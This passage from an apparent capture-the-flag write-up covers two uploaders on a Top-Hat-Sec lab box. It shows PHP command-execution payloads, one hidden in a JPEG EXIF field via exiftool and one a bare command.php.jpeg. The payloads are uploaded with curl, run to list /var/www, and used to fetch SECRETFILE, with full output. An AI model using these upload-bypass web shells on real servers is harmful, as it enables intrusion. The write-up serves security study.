  <span class="p">|</span> grep <span class="s1">&#39;Success!&#39;</span>
curl --silent http://<span class="nv">$IP</span>/uploads2/<span class="nv">$JPEG</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> strings <span class="p">|</span> sed /^Canon/q
</pre></div>
</div>
<p>Running this gives:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~$</span> <span class="nv">JPEG</span><span class="o">=</span>trick.php.jpeg
</span><span class="hll"><span class="gp">hacker@kali:~$</span> curl --silent --output <span class="nv">$JPEG</span>  http://www.exiv2.org/include/img_1771.jpg
</span><span class="hll"><span class="gp">hacker@kali:~$</span> exiftool -DocumentName<span class="o">=</span><span class="s1">&#39;&lt;?php passthru(&quot;ls -laR /var/www&quot;); ?&gt;&#39;</span> <span class="nv">$JPEG</span>
</span><span class="go">    1 image files updated</span>
<span class="hll"><span class="gp">hacker@kali:~$</span> curl --silent <span class="se">\</span>
</span><span class="hll">&gt;      --form <span class="nv">upfile</span><span class="o">=</span><span class="s2">&quot;@</span><span class="nv">$JPEG</span><span class="s2">&quot;</span> <span class="se">\</span>
</span><span class="hll">&gt;      --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Upload Image&quot;</span> <span class="se">\</span>
</span><span class="hll">&gt;      http://<span class="nv">$IP</span>/uploader2.php <span class="se">\</span>
</span><span class="hll">&gt;   <span class="p">|</span> grep <span class="s1">&#39;Success!&#39;</span>
</span><span class="go"> Success! image/jpeg.The file trick.php.jpeg has been uploaded.</span>
<span class="hll"><span class="gp">hacker@kali:~$</span> curl --silent http://<span class="nv">$IP</span>/uploads2/<span class="nv">$JPEG</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> strings <span class="p">|</span> sed /^Canon/q
</span><span class="go">JFIF</span>
<span class="go">Exif</span>
<span class="go">/var/www:</span>
<span class="go">total 12</span>
<span class="go">drwxr-xr-x  3 root root 4096 Feb 17 20:44 .</span>
<span class="go">drwxr-xr-x 12 root root 4096 Feb 17 20:44 ..</span>
<span class="go">drwxr-xr-x  7 root root 4096 Feb 18 22:40 html</span>
<span class="go">/var/www/html:</span>
<span class="go">total 48</span>
<span class="go">drwxr-xr-x 7 root     root     4096 Feb 18 22:40 .</span>
<span class="go">drwxr-xr-x 3 root     root     4096 Feb 17 20:44 ..</span>
<span class="go">-rwxr-xr-x 1 www-data www-data  367 Feb 18 20:54 index.html</span>
<span class="go">-rwxr-xr-x 1 root     root      457 Feb 18 22:30 index2.html</span>
<span class="go">drwxr-xr-x 2 root     root     4096 Feb 18 22:22 jQuery</span>
<span class="go">drwxr-xr-x 2 root     root     4096 Feb 18 22:45 l337saucel337</span>
<span class="go">-rw-r--r-- 1 root     root      398 Feb 18 20:20 uploader.php</span>
<span class="go">-rw-r--r-- 1 root     root     1410 Feb 18 20:50 uploader2.php</span>
<span class="go">-rwxr-xr-x 1 root     root     1980 Feb 18 16:40 uploader3.php</span>
<span class="go">drwxr-xr-x 2 www-data www-data 4096 Apr 21 16:58 uploads1</span>
<span class="go">drwxr-xr-x 2 www-data www-data 4096 Apr 21 19:05 uploads2</span>
<span class="go">drwxr-xr-x 2 www-data root     4096 Feb 18 22:39 uploads3</span>
<span class="go">/var/www/html/jQuery:</span>
<span class="go">total 28</span>
<span class="go">drwxr-xr-x 2 root root 4096 Feb 18 22:22 .</span>
<span class="go">drwxr-xr-x 7 root root 4096 Feb 18 22:40 ..</span>
<span class="go">-rw-r--r-- 1 root root  753 Aug  7  2009 delete.png</span>
<span class="go">-rw-r--r-- 1 root root  715 Feb 18 21:59 script.js</span>
<span class="go">-rw-r--r-- 1 root root 1714 Feb 18 22:00 style.css</span>
<span class="go">-rw-r--r-- 1 root root 1049 Feb 18 22:18 upload.php</span>
<span class="go">-rw-r--r-- 1 root root 1232 Feb 18 22:19 uploadphp.php</span>
<span class="go">/var/www/html/l337saucel337:</span>
<span class="go">total 12</span>
<span class="go">drwxr-xr-x 2 root root 4096 Feb 18 22:45 .</span>
<span class="go">drwxr-xr-x 7 root root 4096 Feb 18 22:40 ..</span>
<span class="hll"><span class="go">-rw-r--r-- 1 root root  400 Feb 18 22:45 SECRETFILE</span>
</span><span class="go">/var/www/html/uploads1:</span>
<span class="go">total 12</span>
<span class="go">drwxr-xr-x 2 www-data www-data 4096 Apr 21 16:58 .</span>
<span class="go">drwxr-xr-x 7 root     root     4096 Feb 18 22:40 ..</span>
<span class="go">-rw-r--r-- 1 www-data www-data   40 Apr 21 16:58 command.php.jpeg</span>
<span class="go">/var/www/html/uploads2:</span>
<span class="go">total 192</span>
<span class="go">drwxr-xr-x 2 www-data www-data  4096 Apr 21 19:05 .</span>
<span class="go">drwxr-xr-x 7 root     root      4096 Feb 18 22:40 ..</span>
<span class="go">-rw-r--r-- 1 www-data www-data 32764 Apr 21 17:22 command.php.jpeg</span>
<span class="go">-rw-r--r-- 1 www-data www-data 10040 Apr 21 17:27 command10000.php.jpeg</span>
<span class="go">-rw-r--r-- 1 www-data www-data 10000 Apr 21 17:26 command10000.php.jpg</span>
<span class="go">-rw-r--r-- 1 www-data www-data 32154 Apr 21 18:45 fake.php.jpeg</span>
<span class="go">-rw-r--r-- 1 www-data www-data 32764 Apr 21 17:17 img_1771.jpg</span>
<span class="go">-rw-r--r-- 1 www-data www-data 32154 Apr 21 19:05 trick.php.jpeg</span>
<span class="go">-rw-r--r-- 1 www-data www-data 32154 Apr 21 18:39 x.php.jpeg</span>
<span class="go">/var/www/html/uploads3:</span>
<span class="go">total 8</span>
<span class="go">drwxr-xr-x 2 www-data root 4096 Feb 18 22:39 .</span>
<span class="go">drwxr-xr-x 7 root     root 4096 Feb 18 22:40 ..</span>
<span class="go">Canon</span>
</pre></div>
</div>
<p>Now we can proceed as in the case of Upload 1 and fetch SECRETFILE:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> curl --silent --remote-name http://<span class="nv">$IP</span>/l337saucel337/SECRETFILE
<span class="gp">hacker@kali:~$</span> cat SECRETFILE
<span class="go">Great job so far. This box has 3 uploaders.</span>

<span class="go">The first 2 are pure php, the last one is php w/jquery.</span>

<span class="go">To get credit for this challenge, please submit a write-up or instructions</span>
<span class="go">on how you compromised the uploader or uploaders. If you solve 1, 2, or all</span>
<span class="go">of the uploader challenges, feel free to shoot me an email and let me know!</span>

<span class="go">admin@top-hat-sec.com</span>

<span class="go">Thanks for playing!</span>
<span class="go">http://www.top-hat-sec.com</span>
</pre></div>
</div>
</div>
<div class="section" id="upload-3-expoit">
<h3>3.19.2.5. Upload 3 Expoit<a class="headerlink" href="#upload-3-expoit" title="Permalink to this headline">¶</a></h3>
<p>Upload 3 is has a form slightly different from Upload 1, but is otherwise the same:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">CMD</span><span class="o">=</span><span class="s2">&quot;ls -laR /var/www&quot;</span>
cat &gt; command.php.jpeg <span class="s">&lt;&lt;EOF</span>
<span class="s">&lt;?php</span>
<span class="s">passthru( &quot;$CMD&quot;);</span>
<span class="s">?&gt;</span>
<span class="s">EOF</span>
curl --silent <span class="se">\</span>
     --form <span class="nv">file</span><span class="o">=</span><span class="s2">&quot;@command.php.jpeg&quot;</span> <span class="se">\</span>
     --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Upload&quot;</span> <span class="se">\</span>
     http://<span class="nv">$IP</span>/jQuery/upload.php <span class="se">\</span>
  <span class="p">|</span> grep <span class="s1">&#39;Your File&#39;</span>
curl http://<span class="nv">$IP</span>/uploads3/command.php.jpeg
</pre></div>
</div>
<p>Running the above shows us the target file <code class="file docutils literal notranslate"><span class="pre">SECRETFILE</span></code>:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~$</span> <span class="nv">CMD</span><span class="o">=</span><span class="s2">&quot;ls -laR /var/www&quot;</span>
</span><span class="hll"><span class="gp">hacker@kali:~$</span> cat &gt; command.php.jpeg <span class="s">&lt;&lt;EOF</span>
</span><span class="gp">&gt;</span><span class="s"> &lt;?php</span>
<span class="gp">&gt;</span><span class="s"> passthru( &quot;$CMD&quot;);</span>
<span class="gp">&gt;</span><span class="s"> ?&gt;</span>
<span class="gp">&gt;</span><span class="s"> EOF</span>
<span class="hll"><span class="gp">hacker@kali:~$</span> curl --silent <span class="se">\</span>
</span><span class="hll">&gt;      --form <span class="nv">file</span><span class="o">=</span><span class="s2">&quot;@command.php.jpeg&quot;</span> <span class="se">\</span>
</span><span class="hll">&gt;      --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Upload&quot;</span> <span class="se">\</span>
</span><span class="hll">&gt;      http://<span class="nv">$IP</span>/jQuery/upload.php <span class="se">\</span>
</span><span class="hll">&gt;   <span class="p">|</span> grep <span class="s1">&#39;Your File&#39;</span>
</span><span class="go">&lt;span&gt;Your File Uploaded Succesfully...!!&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;b&gt;File Name:&lt;/b&gt; command.php.jpeg&lt;br&gt;&lt;b&gt;Type:&lt;/b&gt; image/jpeg&lt;br&gt;&lt;b&gt;Size:&lt;/b&gt; 0.0390625 kB&lt;br&gt;&lt;b&gt;Temp file:&lt;/b&gt; /tmp/phpT8ue8X&lt;br&gt;&lt;b&gt;Stored in:&lt;/b&gt; uploads3/command.php.jpeg&lt;/div&gt;</span>
<span class="hll"><span class="gp">hacker@kali:~$</span> curl http://<span class="nv">$IP</span>/uploads3/command.php.jpeg
</span><span class="go">/var/www:</span>
<span class="go">total 12</span>
<span class="go">drwxr-xr-x  3 root root 4096 Feb 17 20:44 .</span>
<span class="go">drwxr-xr-x 12 root root 4096 Feb 17 20:44 ..</span>
<span class="go">drwxr-xr-x  7 root root 4096 Feb 18 22:40 html</span>

<span class="go">/var/www/html:</span>
<span class="go">total 48</span>
<span class="go">drwxr-xr-x 7 root     root     4096 Feb 18 22:40 .</span>
<span class="go">drwxr-xr-x 3 root     root     4096 Feb 17 20:44 ..</span>
<span class="go">-rwxr-xr-x 1 www-data www-data  367 Feb 18 20:54 index.html</span>
<span class="go">-rwxr-xr-x 1 root     root      457 Feb 18 22:30 index2.html</span>
<span class="go">drwxr-xr-x 2 root     root     4096 Feb 18 22:22 jQuery</span>
<span class="go">drwxr-xr-x 2 root     root     4096 Feb 18 22:45 l337saucel337</span>
<span class="go">-rw-r--r-- 1 root     root      398 Feb 18 20:20 uploader.php</span>
<span class="go">-rw-r--r-- 1 root     root     1410 Feb 18 20:50 uploader2.php</span>
<span class="go">-rwxr-xr-x 1 root     root     1980 Feb 18 16:40 uploader3.php</span>
<span class="go">drwxr-xr-x 2 www-data www-data 4096 Feb 18 22:38 uploads1</span>
<span class="go">drwxr-xr-x 2 www-data www-data 4096 Feb 18 22:39 uploads2</span>
<span class="go">drwxr-xr-x 2 www-data root     4096 Apr 21 14:24 uploads3</span>

<span class="go">/var/www/html/jQuery:</span>
<span class="go">total 28</span>
<span class="go">drwxr-xr-x 2 root root 4096 Feb 18 22:22 .</span>
<span class="go">drwxr-xr-x 7 root root 4096 Feb 18 22:40 ..</span>
<span class="go">-rw-r--r-- 1 root root  753 Aug  7  2009 delete.png</span>
<span class="go">-rw-r--r-- 1 root root  715 Feb 18 21:59 script.js</span>
<span class="go">-rw-r--r-- 1 root root 1714 Feb 18 22:00 style.css</span>
<span class="go">-rw-r--r-- 1 root root 1049 Feb 18 22:18 upload.php</span>
<span class="go">-rw-r--r-- 1 root root 1232 Feb 18 22:19 uploadphp.php</span>

<span class="go">/var/www/html/l337saucel337:</span>
<span class="go">total 12</span>
<span class="go">drwxr-xr-x 2 root root 4096 Feb 18 22:45 .</span>
<span class="go">drwxr-xr-x 7 root root 4096 Feb 18 22:40 ..</span>
<span class="hll"><span class="go">-rw-r--r-- 1 root root  400 Feb 18 22:45 SECRETFILE</span>
</span>
<span class="go">/var/www/html/uploads1:</span>
<span class="go">total 8</span>
<span class="go">drwxr-xr-x 2 www-data www-data 4096 Feb 18 22:38 .</span>
<span class="go">drwxr-xr-x 7 root     root     4096 Feb 18 22:40 ..</span>

<span class="go">/var/www/html/uploads2:</span>
<span class="go">total 8</span>
<span class="go">drwxr-xr-x 2 www-data www-data 4096 Feb 18 22:39 .</span>
<span class="go">drwxr-xr-x 7 root     root     4096 Feb 18 22:40 ..</span>

<span class="go">/var/www/html/uploads3:</span>
<span class="go">total 12</span>
<span class="go">drwxr-xr-x 2 www-data root     4096 Apr 21 14:24 .</span>
<span class="go">drwxr-xr-x 7 root     root     4096 Feb 18 22:40 ..</span>
<span class="go">-rw-r--r-- 1 www-data www-data   40 Apr 21 14:24 command.php.jpeg</span>
</pre></div>
</div>
<p>Now we fetch the SECRETFILE:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> curl --silent --remote-name http://<span class="nv">$IP</span>/l337saucel337/SECRETFILE
<span class="gp">hacker@kali:~$</span> cat SECRETFILE
<span class="go">Great job so far. This box has 3 uploaders.</span>

<span class="go">The first 2 are pure php, the last one is php w/jquery.</span>

<span class="go">To get credit for this challenge, please submit a write-up or instructions</span>
<span class="go">on how you compromised the uploader or uploaders. If you solve 1, 2, or all</span>
<span class="go">of the uploader challenges, feel free to shoot me an email and let me know!</span>

<span class="go">admin@top-hat-sec.com</span>

<span class="go">Thanks for playing!</span>
<span class="go">http://www.top-hat-sec.com</span>
</pre></div>
</div>
</div>
</div>
</div>


           </div>
           
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="vulnix.html" class="btn btn-neutral float-right" title="3.20. Vulnix" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="freshly.html" class="btn btn-neutral" title="3.18. Freshly" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.3',
            LANGUAGE:'None',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  
  
    <script type="text/javascript" src="../_static/js/theme.js"></script>
  

  <script type="text/javascript">
      jQuery(function () {
          
          SphinxRtdTheme.Navigation.enableSticky();
          
      });
  </script> 

</body>
</html>